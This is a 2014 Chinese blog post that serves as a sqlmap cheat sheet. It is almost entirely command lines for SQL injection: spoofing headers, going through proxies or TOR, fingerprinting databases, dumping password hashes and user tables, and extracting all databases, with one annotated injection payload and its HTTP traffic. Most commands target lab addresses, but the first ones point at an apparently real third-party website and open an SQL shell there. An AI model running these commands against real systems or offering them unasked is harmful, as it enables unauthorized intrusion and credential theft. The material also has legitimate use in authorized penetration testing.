---
title: sqlmap简单中文说明
id: 1330
categories:
  - 安全
date: 2014-06-12 23:47:40
tags:
  - sqlmap
  - sql注入
---

整理：mickey

更新
svn checkout https://svn.sqlmap.org/sqlmap/trunk/sqlmap sqlmap-dev

sqlmap.py -u "http://www.islamichina.com/hotelinchina.asp?cityid=2&m=1" -v 1 --sql-shell //执行SQL语句

sqlmap.py -u "http://www.islamichina.com/hotelinchina.asp?cityid=2&m=1" -v 5 //更详细的信息

load options from a configuration INI file
sqlmap -c sqlmap.conf
<!--more-->
使用POST方法提交
sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/post_int.php" --method POST --data "id=1"

使用COOKIES方式提交,cookie的值用;分割,可以使用TamperData来抓cookies
python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/cookie_int.php" --cookie "id=1" -v 1

使用referer欺骗
python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --referer "http://www.google.com" -v 3

使用自定义user-agent,或者使用随机使用自带的user-agents.txt
python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" --user-agent "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)" -v 3

python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" -v 1 -a "./txt/user-agents.txt"

使用基本认证
python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/basic/get_int.php?id=1" --auth-type Basic --auth-cred "testuser:testpass" -v 3

使用Digest认证
python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/digest/get_int.php?id=1" --auth-type Digest --auth-cred "testuser:testpass" -v 3

使用代理,配合TOR
python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --proxy "http://192.168.1.47:3128"
python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --proxy "http://192.168.1.47:8118"

使用多线程猜解
python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" -v 1 --current-user --threads 3

绕过动态检测,直接指定有注入点的参数,可以使用,分割多个参数,指定user-agent注入
python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -v 1 -p "id
python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1&cat=2" -v 1 -p "cat,id"
python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/ua_str.php" -v 1 -p "user-agent" --user-agent "sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)"

指定数据库,绕过SQLMAP的自动检测
python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -v 2 --dbms "PostgreSQL"

* MySQL
* Oracle
* PostgreSQL
* Microsoft SQL Server

指定操作系统,绕过SQLMAP自动检测
python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -v 2 --os "Windows"

* Linux
* Windows

自定义payload
Options: --prefix and --postfix

In some circumstances the vulnerable parameter is exploitable only if the user provides a postfix to be appended to the injection payload. Another scenario where these options come handy presents itself when the user already knows that query syntax and want to detect and exploit the SQL injection by directly providing a injection payload prefix and/or postfix.

Example on a MySQL 5.0.67 target on a page where the SQL query is: $query = "SELECT * FROM users WHERE id=('" . $_GET['id'] . "') LIMIT 0, 1";:

$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_str_brackets.php?id=1" -v 3 -p "id" --prefix "'" --postfix "AND 'test'='test"

[...]
[hh:mm:16] [INFO] testing sql injection on GET parameter 'id' with 0 parenthesis
[hh:mm:16] [INFO] testing custom injection on GET parameter 'id'
[hh:mm:16] [TRAFFIC OUT] HTTP request:
GET /sqlmap/mysql/get_str_brackets.php?id=1%27%29%20AND%207433=7433%20AND%20
%28%27test%27=%27test HTTP/1.1
Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
Host: 192.168.1.121:80
Accept-language: en-us,en;q=0.5
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
image/png,*/*;q=0.5
User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
Connection: close
[...]
[hh:mm:17] [INFO] GET parameter 'id' is custom injectable
[...]

As you can see, the injection payload for testing for custom injection is:

id=1%27%29%20AND%207433=7433%20AND%20%28%27test%27=%27test

which URL decoded is:

id=1') AND 7433=7433 AND ('test'='test

and makes the query syntatically correct to the page query:

SELECT * FROM users WHERE id=('1') AND 7433=7433 AND ('test'='test') LIMIT 0, 1

In this simple example, sqlmap could detect the SQL injection and exploit it without need to provide a custom injection payload, but sometimes in the real world application it is necessary to provide it.

页面比较
python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_refresh.php?id=1" --string "luther" -v 1
python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_refresh.php?id=1" --regexp "<td>lu[\w][\w]er" -v

排除网站的内容
python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_refresh.php?id=1" --excl-reg "Dynamic content: ([\d]+)"

多语句测试，php内嵌函数mysql_query(),不支持多语句
python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --stacked-test -v 1

union注入测试
python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" --union-test -v 1

unionz注入配合orderby
python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_str.php?id=1" --union-test --union-tech orderby -v 1

python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" -v 1 --union-use --banner
python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" -v 5 --union-use --current-user
python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_partialunion.php?id=1" -v 1 --union-use --dbs

fingerprint
python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" -v 1 -f
python sqlmap.py -u "http://192.168.123.36/sqlmap/get_str.asp?name=luther" -v 1 -f -b

判断当前用户是否是dba
python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --is-dba -v 1

列举数据库用户
python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --users -v 0

列举数据库用户密码
python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --passwords -v 0
python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --passwords -U sa -v 0

查看用户权限
python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" --privileges -v 0
python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --privileges -U postgres -v 0

列数据库
python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --dbs -v 0

列出指定数据库指定表的列名
python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --columns -T users -D test -v 1

列出指定数据库的指定表的指定列的内容
python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --dump -T users -D master -C surname -v 0

指定列的范围从2－4
python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --dump -T users -D test --start 2 --stop 4 -v 0

导出所有数据库，所有表的内容
python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --dump-all -v 0

只列出用户自己新建的数据库和表的内容
python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --dump-all --exclude-sysdbs -v 0

sql query
python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --sql-query "SELECT usename FROM pg_user" -v 0
python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --sql-query "SELECT host, password FROM mysql.user LIMIT 1, 3" -v 1

SELECT usename, passwd FROM pg_shadow ORDER BY usename

保存和恢复会话
python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -b -v 1 -s "sqlmap.log"

保存选项到INC配置文件
python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -b -v 1 --save